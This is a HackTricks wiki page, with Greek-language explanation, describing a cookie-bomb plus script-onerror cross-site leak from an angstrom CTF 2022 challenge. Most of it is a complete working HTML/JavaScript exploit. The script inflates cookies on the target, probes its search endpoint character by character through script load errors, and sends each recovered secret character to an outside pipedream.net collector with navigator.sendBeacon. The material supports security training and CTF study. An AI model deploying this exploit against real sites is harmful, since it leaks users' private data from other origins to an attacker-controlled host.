# Cookie Bomb + Onerror XS Leak

{{#include ../../banners/hacktricks-training.md}}

Το παρακάτω **script** που έχει ληφθεί από [**εδώ**](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/) εκμεταλλεύεται μια λειτουργία που επιτρέπει στον χρήστη να **εισάγει οποιοδήποτε ποσό cookies**, και στη συνέχεια φορτώνει ένα αρχείο ως script γνωρίζοντας ότι η πραγματική απάντηση θα είναι μεγαλύτερη από την ψευδή και μετά. Αν είναι επιτυχές, η απάντηση είναι μια ανακατεύθυνση με μια URL που προκύπτει μεγαλύτερη, **πολύ μεγάλη για να διαχειριστεί ο διακομιστής, οπότε επιστρέφει έναν κωδικό κατάστασης http σφάλματος**. Αν η αναζήτηση αποτύχει, δεν θα συμβεί τίποτα γιατί η URL είναι μικρή.
```html
<>'";
<form action="https://sustenance.web.actf.co/s" method="POST">
<input id="f" /><input name="search" value="a" />
</form>
<script>
const $ = document.querySelector.bind(document)
const sleep = (ms) => new Promise((r) => setTimeout(r, ms))
let i = 0
const stuff = async (len = 3500) => {
let name = Math.random()
$("form").target = name
let w = window.open("", name)
$("#f").value = "_".repeat(len)
$("#f").name = i++
$("form").submit()
await sleep(100)
}
const isError = async (url) => {
return new Promise((r) => {
let script = document.createElement("script")
script.src = url
script.onload = () => r(false)
script.onerror = () => r(true)
document.head.appendChild(script)
})
}
const search = (query) => {
return isError(
"https://sustenance.web.actf.co/q?q=" + encodeURIComponent(query)
)
}
const alphabet =
"etoanihsrdluc_01234567890gwyfmpbkvjxqz{}ETOANIHSRDLUCGWYFMPBKVJXQZ"
const url = "//en4u1nbmyeahu.x.pipedream.net/"
let known = "actf{"
window.onload = async () => {
navigator.sendBeacon(url + "?load")
await Promise.all([stuff(), stuff(), stuff(), stuff()])
await stuff(1600)
navigator.sendBeacon(url + "?go")
while (true) {
for (let c of alphabet) {
let query = known + c
if (await search(query)) {
navigator.sendBeacon(url, query)
known += c
break
}
}
}
}
</script>
```
{{#include ../../banners/hacktricks-training.md}}
